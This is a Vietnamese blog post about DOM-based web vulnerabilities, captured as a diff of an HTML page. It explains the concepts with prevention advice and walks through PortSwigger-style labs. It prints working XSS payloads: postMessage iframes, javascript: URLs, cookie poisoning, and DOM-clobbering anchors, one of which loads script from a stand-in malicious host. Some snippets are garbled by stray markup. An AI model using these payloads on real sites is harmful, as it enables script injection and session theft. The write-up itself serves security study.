@@ -1,0 +1,285 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>DOM-based vulnerabilities // DatNLQ</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.88.1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="DatNLQ" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DOM-based vulnerabilities"/>
+<meta name="twitter:description" content="DOM-based vulnerabilities What is DOM-based vulnerabilities ? DOM viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Mô hình này thể hiện tài liệu dưới dạng cấu trúc cây phân cấp. Tất cả các thành phần trong HTML, XML đều được xem như một node. DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML."/>
+
+    <meta property="og:title" content="DOM-based vulnerabilities" />
+<meta property="og:description" content="DOM-based vulnerabilities What is DOM-based vulnerabilities ? DOM viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. Mô hình này thể hiện tài liệu dưới dạng cấu trúc cây phân cấp. Tất cả các thành phần trong HTML, XML đều được xem như một node. DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://datnlq.github.io/posts/dombased/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-09-28T23:38:38+07:00" />
+<meta property="article:modified_time" content="2021-09-28T23:38:38+07:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
+      <h1>DatNLQ</h1>
+      <p>DatNLQ&#39;s personal website</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">DOM-based vulnerabilities</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 28, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          13 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="dom-based-vulnerabilities">DOM-based vulnerabilities</h1>
+<h2 id="what-is-dom-based-vulnerabilities-">What is DOM-based vulnerabilities ?</h2>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOM_based_lythuyet.jpg?raw=true" alt="img"></p>
+<p>DOM viết tắt của Document Object Model là 1 dạng chuẩn của W3C đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML.
+Mô hình này thể hiện tài liệu dưới dạng cấu trúc cây phân cấp. Tất cả các thành phần trong HTML, XML đều được xem như một node. DOM Based XSS là kỹ thuật khai
+thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML.
+<em>Taint-flow vulnerabilities</em>: Nhiều lỗ hổng dựa trên DOM có thể bắt nguồn từ các vấn đề với cách mã phía máy khách thao túng dữ liệu có thể kiểm soát của kẻ tấn công.</p>
+<h2 id="controlling-the-web-message-source">Controlling the web message source</h2>
+<h3 id="exploit--windowpostmessage">Exploit ?? Window.postMessage</h3>
+<p>Thì window.postMessage là một cách để các site có thể Cross-Origin giữa các Windows objects một cách an toàn (nếu được thực hiện đúng),
+phá bỏ hạn chế của SOP đã được đề cập ở trên một cách có kiểm soát.</p>
+<p>postMessage có 2 thành phần chính, đó là:</p>
+<ul>
+<li>
+<p>window.postMessage() — Để gửi message</p>
+</li>
+<li>
+<p>window.addEventListener(“message”,callback) — để nhận và xử lý message</p>
+</li>
+</ul>
+<p>Syntax chung của postMessage như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">targetWindow.postMessage(message, targetOrigin, [transfer]);
+
+  + Tham số [transfer] là optional
+  + Tham số targetWindow : Reference tới một windows hoặc iframe nào đó mà bạn muốn gửi message
+  + Tham số message : Dữ liệu cần gửi đến targetOrigin, có thể là String hoặc JSON Object
+  + Tham số targetOrigin Là phần cực kỳ quan trọng, chính là URL của trang nhận message. Tại thời điểm gửi đi (postMessage), 
+nếu targetOrigin không khớp với hostname của targetWindow’s page, message sẽ không được gửi đi. Nếu chỉ định * sẽ khiến nó khớp với mọi URL,
+tuy nhiên không được khuyến khích bởi lý do bảo mật.
+</code></pre></div><h2 id="what-is-dom-based-open-redirection">What is DOM-based open redirection?</h2>
+<p>Một lỗ hổng DOM-based open redirection phát sinh khi một tập lệnh ghi dữ liệu có thể kiểm soát của hacker vào một hành động kích hoạt điều hướng giữa các miền</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">let url = /https?:\/\/.+/.exec(location.hash);
+if (url) {
+  location = url[0];
+}
+</code></pre></div><p>Hacker có thể sử dụng lỗ hổng này để xây dựng một URL mà nếu người dùng khác truy cập, sẽ gây chuyển hướng đến một miền bên ngoài tùy ý.</p>
+<h2 id="what-is-dom-based-cookie-manipulation">What is DOM-based cookie manipulation?</h2>
+<p>Một số lỗ hổng dựa trên DOM-based cho phép kẻ tấn công thao túng dữ liệu mà chúng thường không kiểm soát. Điều này chuyển đổi các loại dữ liệu thường an toàn, chẳng hạn như cookie, thành các nguồn tiềm năng. Các lỗ hổng thao túng cookie dựa trên DOM phát sinh khi một tập lệnh ghi dữ liệu có thể kiểm soát của kẻ tấn công vào giá trị của cookie.</p>
+<h3 id="what-is-cookie-">What is cookie ?</h3>
+<p>Cookie là những file nhỏ được lưu trữ trên thư mục trình duyệt. Cookie được tạo ra khi người dùng sử dụng trình duyệt của mình để truy cập trang web có sử dụng cookie để theo dõi thao tác của người dùng trên trang web, giúp bạn lưu phiên làm việc, ghi nhớ đăng nhập, chủ để lựa chọn hay tùy chọn các chức năng tùy chỉnh khác.</p>
+<p>Chính bởi khả năng như vậy nên Cookie là 1 phần không thể thiếu đối với các trang web có CSDL lớn, cần đăng nhập, có chủ đề tùy chỉnh và các tính năng nâng cao khác.</p>
+<p>Cookie lưu dữ liệu dưới dạng key - value, có thời gian tồn tại (Do phía nhà phát triển quy định). Khi cookies đã được đọc bởi máy chủ hoặc máy khách, dữ liệu có thể được truy xuất và sử dụng để tùy chỉnh trang web một cách thích hợp.</p>
+<h3 id="impact-of-a-dom-based-cookie-manipulation">Impact of a DOM-based cookie-manipulation</h3>
+<p>Tác động tiềm ẩn của lỗ hổng này phụ thuộc vào vai trò của cookie trong trang web. Nếu cookie được sử dụng để kiểm soát hành vi phát sinh từ các hành động nhất định của người dùng.</p>
+<p>Nếu cookie được sử dụng để theo dõi phiên của người dùng, thì hacker có thể thực hiện một session fixation attack, trong đó chúng đặt giá trị của cookie thành mã thông báo hợp lệ mà chúng đã lấy được từ trang web và sau đó chiếm đoạt phiên trong tương tác tiếp theo của nạn nhân với trang web. Một lỗ hổng thao túng cookie như thế này có thể được sử dụng để tấn công không chỉ trang web dễ bị tấn công mà còn bất kỳ trang web nào khác trong cùng miền.</p>
+<h2 id="what-is-dom-clobbering">What is DOM clobbering?</h2>
+<p>DOM-clobbering là một kỹ thuật trong đó bạn đưa HTML vào một website để thao tác với DOM và cuối cùng thay đổi JavaScript trên trang. Dom-clobbering đặc biệt hữu ích trong những trường hợp không thể thực hiện được XSS, nhưng có thể kiểm soát một số HTML trên trang có id hoặc name được bộ lọc HTML đưa vào whitelist. Hình thức phổ biến nhất của DOM-clobbering là sử dụng một phần tử neo để ghi đè lên một biến toàn cục, biến này sau đó được ứng dụng sử dụng, chẳng hạn như tạo URL tập lệnh động.</p>
+<h3 id="exploit-dom-clobbering">Exploit DOM-clobbering</h3>
+<p>1 kiểu khai báo phổ biến mà Javascript dùng là :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var someObject = window.someObject || {};
+</code></pre></div><p>Nếu chúng ta có thể kiểm soát HTML trên web, thì chúng ta có thể dùng DOM để chặn tham chiếu của someObject bằng đoạn mã sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;script&gt;
+  window.onload = function(){
+    let someObject = window.someObject || {};
+    let script = document.createElement(&#39;script&#39;);
+    script.src = someObject.url;
+    document.body.appendChild(script);
+  };
+&lt;/script&gt;
+</code></pre></div><p>Để khai thác ta có thể chèn HTML sau để chặn tham chiếu someObject bằng một phần tử neo:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;a id=someObject&gt;&lt;a id=someObject name=url href=//malicious-website.com/evil.js&gt;
+</code></pre></div><p>Vì 2 neo này đều sử dụng chung id, DOM sẽ gộp chúng chúng lại với điều đó dẫn đến tham chiếu someObject bị đè, và có thể dẫn đến 1 tập lệnh ở phía ngoài.</p>
+<h2 id="prevent-dom-based-vulnerabilities">Prevent DOM-based vulnerabilities</h2>
+<p>Thật ra bạn không thể tránh hoàn toàn được DOM-based attack. Tuy nhiên, cách hiệu quả nhất để tránh các lỗ hổng dựa trên DOM là tránh cho phép dữ liệu từ bất kỳ
+nguồn không đáng tin cậy nào tự động thay đổi giá trị được truyền đến bất kỳ bộ lưu nào.</p>
+<p>Tránh ghi vào cookie bằng cách sử dụng dữ liệu bắt nguồn từ bất kỳ nguồn không đáng tin cậy nào.</p>
+<p>Tránh thiết lập động các mục tiêu chuyển hướng bằng cách sử dụng dữ liệu bắt nguồn từ bất kỳ nguồn không đáng tin cậy nào.</p>
+<h3 id="prevent-dom-clobbering-attacks">Prevent DOM-clobbering attacks</h3>
+<p>Có thể ngăn chặn DOM-clobbering bằng cách thực hiện kiểm tra để đảm bảo rằng các object hoặc function thực hiện đúng như ý muốn.</p>
+<p>Kiểm tra xem các object hoặc function có hợp pháp không, hãy đảm bảo rằng không phải là nút DOM.</p>
+<p>Tránh sử dụng các biến toàn cục kết hợp với toán tử OR logic.</p>
+<p>Sử dụng một thư viện tốt, chẳng hạn như DOMPurify,..</p>
+<h2 id="dom-based-vulnerabilities-lab">DOM-based Vulnerabilities Lab</h2>
+<h3 id="lab-dom-xss-using-web-messages">Lab: DOM XSS using web messages</h3>
+<p>Bài lab mô tả một lỗ hổng thông báo web đơn giản. Để giải quyết lab, hãy sử dụng máy chủ khai thác để đăng thông báo đến trang đích khiến hàm print () được gọi.</p>
+<p>Truy cập vào bài lab chúng ta thấy được 1 website bán hàng như sau, vì mô tả bài lab là lỗ hổng thông báo web nên chúng ta sẽ kiểm tra source của web như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_message_web.jpg?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_message_source.jpg?raw=true" alt="img"></p>
+<p>Chúng ta phát hiện ra 1 đoạn Javascript như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">window.addEventListener(&#39;message&#39;, function(e) {
+                            document.getElementById(&#39;ads&#39;).innerHTML = e.data;
+                        })
+</code></pre></div><p>Vì đã sử dụng hàm [innerHTML](<img src="https://medium.com/@gregadiaz89/dom-innerhtml-vulnerability-8821a03ef2b8" alt="img"> nên dẫn đến việc chúng ta có thể khai thác lỗ hổng này bằng
+1 payload Javascript xây dựng trên khung iframe như sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe src=&#34;//vulnerable-website&#34; onload=&#34;this.contentWindow.postMessage(&#39;print()&#39;,&#39;*&#39;)&#34;&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_message_exploit.jpg?raw=true" alt="img"></p>
+<p>Khi iframe tải, phương thức [postMessage](<img src="https://portswigger.net/web-security/dom-based/controlling-the-web-message-source" alt="img"> sẽ gửi một thông báo web đến trang chủ. Trình xử lý sự kiện, nhằm phân phát quảng cáo, lấy nội dung của thông điệp web và chèn nó vào
+div với quảng cáo ID. Tuy nhiên, nó sẽ chèn thẻ img của chúng ta, thẻ này chứa thuộc tính src không hợp lệ. Điều này tạo ra một lỗi khiến trình xử lý sự kiện
+onerror thực thi payload là hàm print().</p>
+<p>Và chúng ta đã solve bài lab</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_message_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-dom-xss-using-web-messages-and-a-javascript-url">Lab: DOM XSS using web messages and a JavaScript URL</h3>
+<p>Bài lab này yêu cầu chứng minh một lỗ hổng DOM-based redirection được kích hoạt bởi tin nhắn web. Để giải quyết lab này,
+hãy xây dựng một trang HTML trên máy chủ khai thác khai thác lỗ hổng này và gọi hàm print ().</p>
+<p>Truy cập trang bài lab chúng ta thấy 1 blog như sau:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_javascripturl_blog.jpg?raw=true" alt="img"></p>
+<p>Kiểm tra source code của website để xác định lỗ hổng DOM :</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_javascripturl_source.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">window.addEventListener(&#39;message&#39;, function(e) {
+                            var url = e.data;
+                            if (url.indexOf(&#39;http:&#39;) &gt; -1 || url.indexOf(&#39;![img](https:&#39;) &gt; -1) {
+                                location.href = url;
+                            }
+                        }, false);
+</code></pre></div><p>Chúng ta có thể khai thác dựa vào hàm addEventListener()</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe src=&#34;![img](https://ac7c1f8a1ea066a28036463100a80023.web-security-academy.net/&#34; 
+onload=&#34;this.contentWindow.postMessage(&#39;javascript:print()//http:&#39;,&#39;*&#39;)&#34;&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_javascripturl_exploit.jpg?raw=true" alt="img"></p>
+<p>Tập lệnh này sẽ gửi một thông báo web có chứa payload JavaScript tùy ý, cùng với chuỗi &ldquo;http:&rdquo;. Đối số thứ hai chỉ định rằng mọi targetOrigin đều được phép cho thông báo web.</p>
+<p>Khi iframe tải, phương thức postMessage () sẽ gửi tải trọng JavaScript đến trang chính.
+Trình xử lý sự kiện phát hiện chuỗi &ldquo;http:&rdquo; và tiến hành gửi payload đến location.href, nơi hàm print () được gọi.
+Và chúng ta hoàn thành bài lab theo yêu cầu là gọi hàm print()</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_javascripturl_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-dom-xss-using-web-messages-and-jsonparse">Lab: DOM XSS using web messages and JSON.parse</h3>
+<p>Bài lab này mô tả rằng sử dụng tin nhắn web và phân tích cú pháp tin nhắn dưới dạng JSON. Để giải quyết lab, hãy xây dựng một trang HTML
+trên máy chủ khai thác khai thác lỗ hổng này và gọi hàm print ().</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMXSS_Json_source.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">window.addEventListener(&#39;message&#39;, function(e) {
+                            var iframe = document.createElement(&#39;iframe&#39;), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case &#34;page-load&#34;:
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case &#34;load-channel&#34;:
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case &#34;player-height-changed&#34;:
+                                    ACMEplayer.element.style.width = d.width + &#34;px&#34;;
+                                    ACMEplayer.element.style.height = d.height + &#34;px&#34;;
+                                    break;
+                            }
+                        }, false);
+</code></pre></div><p>addEventListener() này nhận một chuỗi được phân tích cú pháp bằng JSON.parse (). Trong JavaScript, chúng ta có thể
+thấy rằng trình xử lý sự kiện mong đợi một thuộc tính và trường hợp load-channel của câu lệnh switch
+sẽ thay đổi thuộc tính iframe src.
+Chúng ta có thể xây dưng payload dựa trên khung iframe sau :</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe src=![img](https://your-lab-id.web-security-academy.net/ onload=&#39;this.contentWindow.postMessage(&#34;{
+\&#34;type\&#34;:\&#34;load-channel\&#34;,\&#34;url\&#34;:\&#34;javascript:print()\&#34;}&#34;,&#34;*&#34;)&#39;&gt;
+</code></pre></div><p>Chúng ta truy cập vào Exploit Server để Store đoạn payload lên và trở thành 1 phần của website
+sau đó Deliver to Victim để gửi đến website mà chúng ta muốn exploit</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMXSS_Json_exploit.jpg?raw=true" alt="img"></p>
+<p>Khi iframe được load, phương thức postMessage () sẽ gửi một thông báo web đến trang chủ website với load-channel.
+The event listener nhận được thông báo và phân tích cú pháp nó bằng cách sử dụng JSON.parse ()
+trước khi gửi nó đến switch.</p>
+<p>Switch kích hoạt trường hợp load-channel, gán thuộc tính url của thông báo cho thuộc tính src của
+iframe ACMEplayer.element. Trong trường hợp này, thuộc tính url của thư thực sự chứa
+payload JavaScript mà chúng ta đã tạo</p>
+<p>Vì đối số thứ hai chỉ định rằng bất kỳ targetOrigin nào đều được phép cho thông báo web và trình
+xử lý sự kiện không chứa bất kỳ hình thức kiểm tra nguồn gốc nào,payload được đặt làm src của
+iframe ACMEplayer.element. Hàm print () được gọi khi nạn nhân load website.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMXSS_Json_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-dom-based-open-redirection">Lab: DOM-based open redirection</h3>
+<p>Bài lab mô tả rằng blog này có chứa DOM-based open-redirection(lỗ hổng chuyển hướng), và dể khai thác thành công thì hãy chuyển hướng về server exploit.</p>
+<p>Chúng ta kiểm tra source code và phát hiện đây chính là lỗi mà lab nhắc đến</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_redirection_source.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;a href=&#39;#&#39; onclick=&#39;returnURL&#39; = /url=https?:\/\/.+)/.exec(location); 
+if(returnUrl)location.href = returnUrl[1];else location.href = &#34;/&#34;&#39;&gt;Back to Blog&lt;/a&gt;
+</code></pre></div><p>Chức năng của đoạn code này là khi chúng ta truy cập 1 bài viết nào sẽ có đường link dẫn chúng ta quay về trang chủ bằng biến url
+Điều đó làm chúng ta có payload sau:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">![img](https://ac9e1f1e1e10941180196da900770014.web-security-academy.net/postId=4&amp;
+url=![img](https://exploit-ac5f1f7c1ea294d180d16d44012300af.web-security-academy.net/
+</code></pre></div><p>Khi load đường link này chúng ta có thể hoàn thành bài lab.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_redirection_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-dom-based-cookie-manipulation">Lab: DOM-based cookie manipulation</h3>
+<p>This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a
+different page and call the print() function. You will need to use the exploit server to direct the victim to the correct pages.</p>
+<p>Bài lab mô tả rằng lỗi thao tác DOM-based client-side cookie này có trên web. Để hoàn thành bài lab, chúng ta phải inject 1 cookie sẽ gây ra XSS trên một trang khác và gọi hàm print ().
+Và chúng ta cần sự hỗ trợ của của exploit server.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_manipulation_website.jpg?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_manipulation_source.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">document.cookie = &#39;lastViewedProduct=&#39; + window.location + &#39;; SameSite=None; Secure&#39;
+</code></pre></div><p>Dựa vào đoạn source code trên chúng ta nhận thấy trang web phản ánh các giá trị từ lastViewedProduct mà không mã hóa HTML một cách không an toàn, kẻ tấn công có thể sử dụng các kỹ thuật thao túng lastViewedProduct để exploit lỗ hổng này.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe src=&#34;![img](https://your-lab-id.web-security-academy.net/product?productId=1&amp;&#39;&gt;&lt;script&gt;print()&lt;/script&gt;&#34;
+onload=&#34;if(!window.x)this.src=&#39;![img](https://your-lab-id.web-security-academy.net&#39;;window.x=1;&#34;&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_manipulation_exploitserver.jpg?raw=true" alt="img"></p>
+<p>Nguồn ban đầu của iframe khớp với URL của một trong các trang sản phẩm, ngoại trừ có một payload JavaScript được thêm vào cuối. Khi iframe load lần đầu tiên, trình duyệt tạm thời mở URL độc hại, URL này sau đó được lưu dưới dạng giá trị của cookie lastViewedProduct. Trang web vẫn chạy bình thường mà không biết việc gán cookie được diễn ra. Trong khi trình duyệt của nạn nhân đã lưu cookie bị nhiễm độc, việc load website sẽ chạy payload được exploit.</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_manipulation_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-exploiting-dom-clobbering-to-enable-xss">Lab: Exploiting DOM clobbering to enable XSS</h3>
+<p>Bài lab đã mô tả rằng website tồn tại lỗ hổng DOM-clobbering và chức năng comment của website cho phép comment HTML &ldquo;an toàn&rdquo;. Để hoàn thành lab, chúng ta phải injection HTML vào để kích hoạt XSS.
+Xem source code của trang web:
+<img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_source.jpg?raw=true" alt="img">
+Website sử dụng bộ lọc DOMPurify để cố gắng giảm các lỗ hổng dựa trên DOM. Tuy nhiên, DOMPurify cho phép bạn sử dụng giao thức cid:, không mã hóa URL trong dấu ngoặc kép. Điều này có nghĩa là bạn có thể đưa vào một dấu ngoặc kép được mã hóa sẽ được giải mã trong thời gian chạy. Do đó, việc chèn được mô tả ở trên sẽ khiến biến defaultAvatar được gán thuộc tính clobbered {avatar: ‘cid:&ldquo;onerror=alert(1)//’} vào lần cmt tiếp theo.</p>
+<p>Điều đó có nghĩa là khi chúng ta commment lần thứ 2 thì payload sẽ được kích hoạt.
+Source:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">let defaultAvatar = window.defaultAvatar || {avatar: &#39;/resources/images/avatarDefault.svg&#39;}
+</code></pre></div><p>Comment truyền payload
+<img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_cmtpayload.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href=&#34;cid:&amp;quot;onerror=alert(Hacker)//&#34;&gt;
+</code></pre></div><p>defaultAvatar được triển khai bằng cách sử dụng mẫu nguy hiểm này có chứa toán tử OR logic kết hợp với một biến toàn cục. Điều này dẫn đến lỗ hổng DOM-clobbering</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_cmt2.jpg?raw=true" alt="img"></p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_solve.jpg?raw=true" alt="img"></p>
+<h3 id="lab-clobbering-dom-attributes-to-bypass-html-filters">Lab: Clobbering DOM attributes to bypass HTML filters</h3>
+<p>Lab này sử dụng thư viện HTMLJanitor, thư viện dễ bị tấn công bởi DOM-clobbering. Để giải quyết bài lab, hãy xây dựng một vectơ bỏ qua bộ lọc và sử dụng chức năng chặn DOM-clobbering để đưa vào một vectơ gọi hàm print (). Bạn có thể cần sử dụng máy chủ khai thác để làm cho vectơ của bạn tự động thực thi trong trình duyệt của nạn nhân.</p>
+<p>Comment payload:</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_filter_cmt.jpg?raw=true" alt="img"></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;form id=x tabindex=0 onfocus=print()&gt;&lt;input id=attributes&gt;
+</code></pre></div><p>Exploit server:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&lt;iframe src=![img](https://your-lab-id.web-security-academy.net/post?postId=3 onload=&#34;setTimeout(()=&gt;this.src=this.src+&#39;#x&#39;,500)&#34;&gt;
+</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_filter_exploitserver.jpg?raw=true" alt="img"></p>
+<p>Thư viện sử dụng thuộc tính attributes  để lọc các thuộc tính HTML. Tuy nhiên, nó vẫn có thể che lấp bản thân thuộc tính attributes , khiến độ dài không được xác định. Điều này cho phép chúng ta đưa bất kỳ thuộc tính nào chúng ta muốn vào phần tử biểu mẫu. Trong trường hợp này, chúng ta sử dụng thuộc tính onfocus để nhập lậu hàm print ().</p>
+<p>Khi iframe được tải, sau độ trễ 500ms, iframe sẽ thêm đoạn #x vào cuối URL trang. Sự chậm trễ là cần thiết để đảm bảo rằng chú thích chứa nội dung chèn được tải trước khi JavaScript được thực thi. Điều này khiến trình duyệt tập trung vào phần tử có ID &ldquo;x&rdquo;, là biểu mẫu chúng ta đã tạo bên trong nhận xét. Sau đó, trình xử lý sự kiện onfocus gọi hàm print ()</p>
+<p><img src="https://github.com/datnlq/Source/blob/main/DOM_based/image/DOMbased_clobbering_filter_solve.jpg?raw=true" alt="img"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
